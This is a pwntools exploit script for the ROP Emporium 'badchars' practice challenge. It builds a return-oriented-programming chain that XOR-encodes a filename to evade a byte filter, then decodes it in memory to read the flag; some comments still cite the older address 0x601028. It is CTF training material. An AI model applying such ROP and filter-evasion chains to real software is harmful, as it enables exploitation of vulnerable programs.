#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ROP Emporium "badchars" —— 字符串被字符过滤时，用 XOR 编码绕过

题目：64 位 ELF（No PIE / NX / 无 canary / Partial RELRO / not stripped）。
      `pwnme` / `print_file` 在 `libbadchars.so`（RUNPATH = b'.'）。

和 31 write4 的区别：
  * write4 只要求"能写内存"；
  * badchars 额外要求"**payload 里不能出现 `x` `g` `a` `.`**"——
    `pwnme` 把 `read()` 读进来的每一个字节与 `badcharacters = "xga."` 逐个比较，
    命中就把该字节改成 `0xeb`。于是 `"flag.txt"` 里的 `g` / `a` / `.`
    不能直接出现在 payload 里。

解法：**先写密文，再在栈上解密**。
  1. `"flag.txt"` 每个字节 XOR 2 → `"dnce,vzv"`（8 个字节全部避开 `x g a .`）；
  2. `pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` + `mov [r13], r12`
     把密文写进 `.data`（0x601028）；
  3. 循环 8 次：`pop r14 ; pop r15 ; ret`（r14b = 2，r15 = 目标地址）
     + `xor byte ptr [r15], r14b ; ret`，把密文原地解密成 `"flag.txt"`；
  4. `print_file(0x601028)`。

为什么用 XOR 2 而不是别的 key：`"flag.txt" ^ 2 == "dnce,vzv"`，
既躲开四个坏字符，各 gadget / 地址的低 3 字节也不含坏字符
（EXP 里有 `assert not set(payload) & BAD` 做自检，改 key 或改地址会立刻报错）。

gadget（`objdump -d -M intel badchars`，全部落在 `usefulGadgets`）：

| 地址 | gadget |
| --- | --- |
| `0x40069c` | `pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` |
| `0x400634` | `mov qword ptr [r13], r12 ; ret` |
| `0x4006a0` | `pop r14 ; pop r15 ; ret` |
| `0x400628` | `xor byte ptr [r15], r14b ; ret` |
| `0x4006a3` | `pop rdi ; ret` |
| `0x400510` | `print_file@plt` |

长度预算：`read` 上限 0x200 = 512 字节。本链 40 + 56 + 8×32 + 24 = **376 字节**
（用 `pop r14 ; pop r15` 而不是每次都用 4 个 pop 的版本，省 8×16 字节）。
"""

import os
import resource
import sys

from pwn import *  # noqa: F401,F403

context(os="linux", arch="amd64", log_level="info")

# 链跑完时目标进程的栈已被破坏，退出会 SIGSEGV；关掉 core，别在题目录里留 core.*
resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

os.chdir(os.path.dirname(os.path.abspath(__file__)))
BIN = "./badchars"

HOST = os.getenv("HOST", "")          # 官方无公开远程：默认只跑本地
PORT = int(os.getenv("PORT", "0"))

# ---- gadget ----
POP_R12_R13_R14_R15 = 0x40069C   # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
MOV_R13_R12         = 0x400634   # mov qword ptr [r13], r12 ; ret
POP_R14_R15         = 0x4006A0   # pop r14 ; pop r15 ; ret
XOR_R15_R14B        = 0x400628   # xor byte ptr [r15], r14b ; ret
POP_RDI             = 0x4006A3   # pop rdi ; ret
PRINT_FILE          = 0x400510   # print_file@plt

# ---- 可写目标 / 参数 ----
# 写到 0x601030 而不是 0x601028：后者在 i=6 时会访问 0x60102e，
# 低字节 0x2e 正是坏字符 '.'，payload 会被 pwnme 改成 0xeb。
# 0x601030..0x601037 是 .data 的后 8 字节，紧随其后的 0x601038 是 .bss（初值 0），
# 天然就是字符串终止符，且不会碰到 heap（heap 从 0x601040 起）。
DATA     = 0x601030
FILENAME = b"flag.txt"
XOR_KEY  = 2                 # "flag.txt" ^ 2 == "dnce,vzv"，不含坏字符
BAD      = set(b"xga.")      # pwnme 会把命中的字节改成 0xeb
OFFSET   = 0x28              # pwnme: read(0, rbp-0x20, 0x200)


def start() -> tube:
    if args.LOCAL or not HOST:
        return process(BIN)
    return remote(HOST, PORT)


def build() -> bytes:
    enc = bytes(c ^ XOR_KEY for c in FILENAME)
    log.info("encoded filename = %s", enc)

    chain = flat(
        b"A" * OFFSET,
        POP_R12_R13_R14_R15,
        u64(enc),                # r12 = 密文（8 字节小端）
        DATA,                    # r13 = 目标地址
        XOR_KEY,                 # r14 = 2（后面当 r14b 用）
        0,                       # r15 占位
        MOV_R13_R12,             # *(u64*)0x601028 = 密文
    )
    for i in range(len(FILENAME)):
        chain += flat(
            POP_R14_R15, XOR_KEY, DATA + i,
            XOR_R15_R14B,        # *(u8*)(0x601028+i) ^= 2
        )
    chain += flat(POP_RDI, DATA, PRINT_FILE)

    hit = sorted(set(chain) & BAD)
    assert not hit, "payload 含坏字符：%r" % [chr(c) for c in hit]
    assert len(chain) < 0x200, "read 上限 0x200，当前 %d" % len(chain)
    return chain


def main() -> int:
    payload = build()
    log.info("payload = %d bytes", len(payload))
    p = start()
    p.recvuntil(b"> ")
    p.send(payload)
    out = p.recvrepeat(3)
    p.close()

    text = out.decode("utf-8", "ignore")
    print(text)
    ok = "ROPE" in text or "FLAG" in text
    if ok:
        log.success("got flag line above")
    else:
        log.failure("no flag, check gadgets/offset/key")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
